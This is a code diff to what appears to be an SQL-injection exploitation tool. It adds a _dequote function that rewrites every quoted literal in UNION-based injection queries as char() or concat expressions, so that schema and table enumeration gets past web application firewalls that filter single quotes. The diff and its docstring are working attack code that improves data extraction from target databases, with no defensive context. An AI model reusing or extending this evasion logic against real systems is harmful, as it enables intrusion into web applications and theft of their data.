@@ -446,6 +446,14 @@ def _strlit(dbms, s):
     return "(" + "+".join(f"char({c})" for c in codes) + ")"      # mssql
 
 
+def _dequote(dbms, frag):
+    """Rewrite every 'literal' in a SQL fragment as a quote-free literal (see
+    _strlit), so the *whole* union path survives a single-quote-filtering WAF —
+    not just the markers, but the catalog predicates baked into the FROM clauses
+    (`type='table'`, `table_schema='public'`, …)."""
+    return re.sub(r"'([^']*)'", lambda m: _strlit(dbms, m.group(1)), frag)
+
+
 def _ucat(dbms, parts):
     if dbms == "mysql":
         return "concat(" + ",".join(parts) + ")"
@@ -504,7 +512,8 @@ def union_value(http, oracle, dbms, ncols, refcol, expr):
 def _union_list(http, oracle, dbms, ncols, refcol, which, **fmt):
     if "t" in fmt:                       # table name goes in as a quote-free literal
         fmt["t"] = _strlit(dbms, fmt["t"])
-    col, _, frm = _UFROM[dbms][which].format(**fmt).partition(" FROM ")
+    frag = _dequote(dbms, _UFROM[dbms][which].format(**fmt))   # also the static predicates
+    col, _, frm = frag.partition(" FROM ")
     data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, col)} FROM {frm}")
     return [x for x in data.split(_UROWSEP) if x]
 
